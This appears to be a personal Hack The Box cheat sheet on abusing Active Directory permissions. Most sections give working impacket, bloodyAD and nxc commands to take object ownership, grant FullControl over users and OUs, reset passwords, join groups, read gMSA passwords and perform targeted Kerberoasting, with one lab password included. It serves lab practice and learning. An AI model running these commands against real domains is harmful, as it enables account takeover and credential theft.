# WriteOwner

This gives you the ability to modify the owner of an object.

To modify the ownership of an object:
```bash
python /usr/share/doc/python3-impacket/examples/owneredit.py -action write -new-owner 'ownedUser' -target 'targetUser' 'domain.htb/ownedUser':'password'
```

To abuse the ownership of an object, you can grant yourself the GenericALL permission.

# GenericWrite
This grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user.

# GenericAll

This gives you full control over an object. You can manipulate the target as you wish. 

```bash
python /usr/share/doc/python3-impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'userToGrantPrivsTo' -target 'targetUser' 'domain.htb/user':'password'
```

## User 
If you have GenericAll on a user, you can do the following:
1) Perform Shadow Credentials to modify attributes and requests certificates for authentication.
2) Kerberoasting
3) ForceChangePassword

## OU
If you have GenericAll on an OU, you can add a new ACE on the OU that will inherit down to the objects under that OU. 

### Generic Descendent Object Takeover

```bash
python /usr/share/doc/python3-impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'userToGrantPrivsTo' -target-dn 'OU=NAMEOFOU,DC=NAMEOFDC,DC=HTB' 'domain.htb/user':'password'
```

# ForceChangePassword

Allows you to change the user's password without knowing that user's current password.

```bash 
bloodyAD --host "10.1.1.1" -d "domain.htb" -u 'ownedUser' -p "password" set password "targetUser" "password"
```

# AddSelf

This gives the ability to add itself to a group which will inherit the same privileges as that group.

```bash
bloodyAD --host "10.1.1.1" -d "domain.htb" -u "owneduser" -p "password" add groupMember "group" "userToAdd"
```

# ReadGMSA

Allows you to retrieve the password for a "Group Managed Service Account".

```bash 
nxc ldap domain.local -u "user" -p "password" --gmsa
```


# TargetedKerberoasting

## Add servicePrincipalName
```bash
bloodyAD -d "rustykey.htb" --host "dc.rustykey.htb" -u "IT-Computer3$" -p 'Rusty88!' set object "dd.ali" servicePrincipalName -v 'http/anything'
```

## Kerberoast

```bash
nxc ldap -k "rustykey.htb" -d "rustykey.htb" -u "IT-Computer3$" -p 'Rusty88!' --kerberoasting kerberoastables.txt
```



# Add Shadow Credential




![[Pasted image 20250630122617.png]]